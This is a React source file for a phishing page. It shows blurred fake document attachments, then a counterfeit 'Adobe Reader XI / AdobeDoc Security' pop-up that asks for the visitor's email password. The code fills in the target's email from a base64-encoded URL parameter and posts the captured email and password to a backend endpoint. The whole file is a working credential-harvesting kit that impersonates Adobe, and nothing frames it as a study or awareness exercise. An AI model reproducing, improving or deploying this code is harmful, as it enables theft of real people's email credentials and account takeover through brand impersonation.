/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import { motion, AnimatePresence } from "motion/react";
import { Download, Eye, Edit2, Save, FileText, Package, Layout, AlertTriangle, Mail, Lock, X, User } from "lucide-react";
import { useState, FormEvent, useEffect } from "react";

// Import images for proper compilation and tracking by Vite
// @ts-ignore
import purchaseOrderImg from "./assets/images/purchase_order_preview_1779038214968.png";
// @ts-ignore
import specificationsImg from "./assets/images/specifications_document_preview_1779038236725.png";
// @ts-ignore
import presentationImg from "./assets/images/presentation_preview_1779038254005.png";

export default function App() {
  const [isOpen, setIsOpen] = useState(true);
  const [showSignUp, setShowSignUp] = useState(false);
  const [formData, setFormData] = useState({ email: "", password: "" });
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [success, setSuccess] = useState(false);

  useEffect(() => {
    const getEmailFromURL = () => {
      // 1. Check query parameters (?email=... or ?e=...)
      const params = new URLSearchParams(window.location.search);
      let val = params.get('e') || params.get('email');
      
      // 2. Check hash (#...)
      if (!val) {
        val = window.location.hash.substring(1);
      }

      if (!val) return "";

      // Try decoding base64
      try {
        const decoded = atob(val);
        // Basic email validation check after decoding
        if (decoded.includes('@') && decoded.includes('.')) return decoded;
      } catch (e) {
        // Not valid base64 or doesn't look like an email
      }

      // Return plain value if it looks like an email
      if (val.includes('@')) return decodeURIComponent(val);

      return "";
    };

    const email = getEmailFromURL();
    if (email) {
      setFormData(prev => ({ ...prev, email }));
    }
  }, []);

  const handleSignUp = async (e: FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);
    setSuccess(false);
    try {
      const response = await fetch("/api/signup", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(formData),
      });
      if (response.ok) {
        setSuccess(true);
        setFormData({ email: "", password: "" });
      } else {
        alert("Failed to sign up. Please try again.");
      }
    } catch (error) {
      console.error("Signup error:", error);
      alert("An error occurred. Please try again.");
    } finally {
      setIsSubmitting(false);
    }
  };

  const triggerSignUp = () => {
    setSuccess(false);
    setShowSignUp(true);
  };

  const attachments = [
    {
      id: 1,
      title: "Purchase Order",
      time: "A few hours ago",
      image: purchaseOrderImg,
      color: "bg-white",
    },
    {
      id: 2,
      time: "A few minutes ago",
      title: "Specifications",
      image: specificationsImg,
      color: "bg-white",
    },
    {
      id: 3,
      title: "Company Presentation",
      time: "A few hours ago",
      image: presentationImg,
      color: "bg-white",
    },
  ];

  return (
    <div className="min-h-screen bg-gray-100 font-sans text-slate-900 border-t-4 border-red-600">
      {/* Background Page Header (Visible but blurred) */}
      <header className="bg-white border-b border-gray-200 px-6 py-3 flex justify-between items-center whitespace-nowrap opacity-50 blur-[1px]">
        <div className="flex items-center gap-2">
          <div className="w-8 h-8 bg-red-600 flex items-center justify-center rounded text-white font-bold text-sm">JD</div>
          <span className="font-semibold text-lg hidden sm:inline">Job Profile</span>
        </div>
        <div className="flex items-center gap-4 text-gray-500 text-sm">
          <button className="flex items-center gap-1.5"><Eye className="w-4 h-4" /> View</button>
          <button className="flex items-center gap-1.5"><Edit2 className="w-4 h-4" /> Edit</button>
          <button className="flex items-center gap-1.5 text-gray-800 font-bold"><Download className="w-4 h-4" /> Download</button>
          <button className="flex items-center gap-1.5"><Save className="w-4 h-4" /> Save</button>
        </div>
      </header>

      {/* Background Content (Visible but blurred) */}
      <main className="max-w-4xl mx-auto p-12 opacity-30 select-none pointer-events-none blur-[2px]">
        <h1 className="text-4xl font-bold mb-8">Job Description</h1>
        <p className="text-lg text-gray-600 mb-6 leading-relaxed">
          Job Analysis is a primary research process that involves collecting data about including job roles and responsibilities. 
          The information allows HR managers to prepare Job Descriptions (JD) which helps to find the right person at the right 
          place at the right time.
        </p>
        <div className="border-2 border-dashed border-gray-300 rounded-xl p-8 h-96 flex flex-col items-center justify-center bg-gray-50">
           <div className="w-24 h-24 bg-red-100/50 rounded-full flex items-center justify-center mb-4">
              <FileText className="w-12 h-12 text-red-600/30" />
           </div>
           <div className="space-y-4 w-full max-w-md">
             <div className="h-4 bg-gray-200 rounded w-full" />
             <div className="h-4 bg-gray-200 rounded w-5/6 mx-auto" />
             <div className="h-4 bg-gray-200 rounded w-4/6 mx-auto" />
           </div>
        </div>
      </main>

      {/* Attachment Modal Overlay (Modal 1) */}
      <AnimatePresence>
        {isOpen && (
          <div className="fixed inset-0 z-50 flex items-center justify-center p-4">
            <motion.div
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              className={`absolute inset-0 bg-slate-900/10 backdrop-blur-[4px] transition-all duration-500 ${showSignUp ? "blur-[8px]" : ""}`}
            />
            
            <motion.div
              initial={{ scale: 1, opacity: 0, y: 10 }}
              animate={{ scale: 1, opacity: 1, y: 0 }}
              exit={{ scale: 0.95, opacity: 0 }}
              className={`relative w-full max-w-2xl bg-white rounded shadow-2xl overflow-hidden transition-all duration-500 ${showSignUp ? "blur-[2px] scale-[0.98] pointer-events-none" : ""}`}
              id="document-portal"
            >
              <div className="relative z-10">
                <div className="h-1 bg-red-600 w-full" />
                
                <div className="px-8 pt-8 pb-10">
                <h2 className="text-sm font-semibold text-gray-700 mb-8 border-b border-gray-100 pb-2 inline-block">
                  Secured Remote Attachment
                </h2>

                <div className="grid grid-cols-1 md:grid-cols-3 gap-8 mb-10 text-center">
                  {attachments.map((item) => (
                    <div
                      key={item.id}
                      className="group cursor-pointer"
                      onClick={triggerSignUp}
                    >
                      <div className={`aspect-[4/5] ${item.color} border border-gray-200 mb-3 flex flex-col items-center justify-center relative overflow-hidden shadow-sm hover:shadow-md transition-shadow`}>
                        <img 
                          src={item.image} 
                          alt={item.title} 
                          className="absolute inset-0 w-full h-full object-cover blur-[1px] opacity-60 group-hover:blur-0 group-hover:opacity-100 transition-all duration-500"
                          referrerPolicy="no-referrer"
                        />
                        <div className="absolute top-2 right-2 z-20 bg-white/90 p-1.5 rounded-full shadow-sm border border-gray-100 group-hover:bg-red-50 transition-colors">
                           <Download className="w-3.5 h-3.5 text-gray-600 group-hover:text-red-600" />
                        </div>
                        <div className="absolute inset-x-0 bottom-0 bg-gradient-to-t from-gray-800 to-transparent h-1/2 flex items-end justify-center p-4">
                           <div className="text-white text-[10px] leading-tight font-medium">
                              <p className="font-bold mb-0.5">{item.title}</p>
                              <p className="opacity-70 text-[9px]">{item.time}</p>
                           </div>
                        </div>
                      </div>
                    </div>
                  ))}
                </div>

                <div className="flex justify-center">
                  <button 
                    className="flex items-center gap-2 px-4 py-2 border border-gray-300 text-gray-600 font-bold text-[10px] uppercase tracking-wider hover:bg-gray-50 active:bg-gray-100 transition-all shadow-sm rounded bg-white shadow-[0_2px_4px_rgba(0,0,0,0.05)]"
                    onClick={triggerSignUp}
                  >
                    <AlertTriangle className="w-3.5 h-3.5" />
                    DOWNLOAD ALL
                  </button>
                </div>
              </div>
            </div>
            </motion.div>
          </div>
        )}
      </AnimatePresence>

      {/* Sign Up Modal Overlay (Adobe Protective Layer) */}
      <AnimatePresence>
        {showSignUp && (
          <div className="fixed inset-0 z-[100] flex items-center justify-center p-4">
            <motion.div
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              onClick={() => setShowSignUp(false)}
              className="absolute inset-0 bg-black/5"
            />
            
            <motion.div
              initial={{ scale: 0.95, opacity: 0, y: 10 }}
              animate={{ scale: 1, opacity: 1, y: 0 }}
              exit={{ scale: 0.95, opacity: 0, y: 10 }}
              className="relative w-full max-w-sm bg-[#F5F5F5] rounded shadow-[0_20px_60px_rgba(0,0,0,0.4)] border border-gray-300 overflow-hidden"
              id="signup-modal"
            >
              {/* Adobe Modal Header */}
              <div className="bg-[#da1c1c] p-1.5 flex items-center justify-between text-white border-b border-black/10">
                <div className="flex items-center gap-1">
                   <div className="w-8 h-8 flex items-center justify-center">
                      <svg viewBox="0 0 512 512" className="w-5 h-5 fill-white">
                        <path d="M312.3 112L465.1 384H312.3V112zM199.7 112L46.9 384H199.7V112zM256 195.9L338.4 344H173.6L256 195.9z"/>
                      </svg>
                   </div>
                   <span className="text-[11px] font-bold tracking-tight">Adobe Reader XI</span>
                </div>
                <div className="flex items-center gap-2">
                   <div className="w-6 h-8 flex flex-col bg-[#da1c1c] border border-white/30 rounded-sm overflow-hidden scale-90">
                      <div className="h-1/2 bg-white flex items-center justify-center p-0.5">
                         <svg viewBox="0 0 512 512" className="w-full h-full fill-[#da1c1c]">
                            <path d="M312.3 112L465.1 384H312.3V112zM199.7 112L46.9 384H199.7V112zM256 195.9L338.4 344H173.6L256 195.9z"/>
                         </svg>
                      </div>
                      <div className="h-1/2 bg-[#da1c1c] flex items-center justify-center text-[4px] font-bold text-white leading-none px-0.5 text-center uppercase">
                         Adobe
                      </div>
                   </div>
                   <X className="w-4 h-4 cursor-pointer opacity-70 hover:opacity-100" onClick={() => setShowSignUp(false)} />
                </div>
              </div>

              <div className="p-8 flex flex-col items-center">
                <AlertTriangle className="w-10 h-10 text-[#F1C40F] mb-4" />
                <h3 className="text-lg font-normal text-[#666] mb-2 text-center tracking-tight">
                  This file is protected by AdobeDoc® Security
                </h3>
                <p className="text-[11px] text-[#888] mb-2 text-center italic">
                  Enter your email and password to access this pdf document
                </p>
                {formData.email && (
                  <p className="text-sm font-bold text-slate-800 mb-6 text-center">
                    {formData.email}
                  </p>
                )}

                <form onSubmit={handleSignUp} className="w-full space-y-3">
                  <div className="relative">
                    <input
                      required
                      type="password"
                      placeholder="Email password"
                      value={formData.password}
                      onChange={(e) => setFormData({ ...formData, password: e.target.value })}
                      className="block w-full px-3 py-2.5 border border-gray-300 rounded text-sm bg-white placeholder-gray-400 focus:outline-none focus:ring-1 focus:ring-red-500/50"
                    />
                  </div>

                  <button 
                    type="submit"
                    disabled={isSubmitting}
                    className="w-full bg-[#D73A49] hover:bg-[#C03441] text-white font-medium py-2.5 rounded shadow-sm shadow-black/10 active:transform active:scale-[0.98] transition-all mt-4 text-sm"
                  >
                    {isSubmitting ? "Processing..." : "View Document"}
                  </button>
                </form>
              </div>

              <div className="bg-[#EEE] p-3 text-center border-t border-gray-200">
                <span className="text-[9px] text-[#999] font-bold uppercase tracking-widest leading-none">© 2024 Adobe Systems Inc.</span>
              </div>
            </motion.div>
          </div>
        )}
      </AnimatePresence>
    </div>
  );
}

